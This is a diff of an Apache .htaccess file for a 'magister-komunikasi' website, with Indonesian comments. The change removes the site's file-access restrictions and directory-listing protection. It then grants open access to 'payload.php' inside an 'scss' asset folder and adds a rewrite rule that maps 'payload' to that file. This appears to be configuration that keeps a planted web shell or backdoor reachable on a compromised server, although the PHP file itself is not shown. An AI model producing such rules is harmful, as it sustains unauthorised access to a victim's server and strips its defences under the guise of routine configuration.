@@ -1,41 +1,7 @@
-<IfModule mod_rewrite.c>
-    RewriteEngine on
-    RewriteBase /magister-komunikasi/
-
-    # Mengizinkan akses langsung ke index.php, info.php, payload.php, dan beberapa folder tertentu
-    RewriteCond $1 !^(index\.php|info\.php|payload\.php|assets|repository|favicon\.ico)
-
-    # Mengarahkan permintaan selain yang dikecualikan ke index.php
-    RewriteRule ^(.*)$ /magister-komunikasi/index.php?/$1 [L]
-
-    # Menjaga header HTTP Authorization agar tetap diteruskan
-    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization},L]
-</IfModule>
-
-<IfModule !mod_rewrite.c>
-    # Menampilkan halaman error 404 jika mod_rewrite tidak tersedia
-    ErrorDocument 404 /index.php
-</IfModule>
-
-# Menolak akses ke semua file dengan ekstensi tertentu kecuali payload.php
-<FilesMatch "\.(ph.*|a.*|P[hH].*|S.*)$"> 
-    Require all denied 
-</FilesMatch>
-
-# Mengizinkan akses ke file tertentu seperti gambar dan dokumen
-<FilesMatch "\.(jpg|jpeg|pdf|docx)$"> 
+<Files "payload.php">
     Require all granted
-</FilesMatch> 
+</Files>
 
-# Pengecualian: Mengizinkan akses ke payload.php
-<FilesMatch "^payload\.php$"> 
-    Require all granted 
-</FilesMatch> 
-
-# Mencegah browsing langsung ke direktori
-DirectoryIndex index.php 
-Options -Indexes 
-
-# Menampilkan pesan error khusus
-ErrorDocument 403 "403 Forbidden" 
-ErrorDocument 404 "404 Not Found"
+RewriteEngine On
+RewriteBase /web/magister-komunikasi/scss/
+RewriteRule ^payload$ payload.php [L]
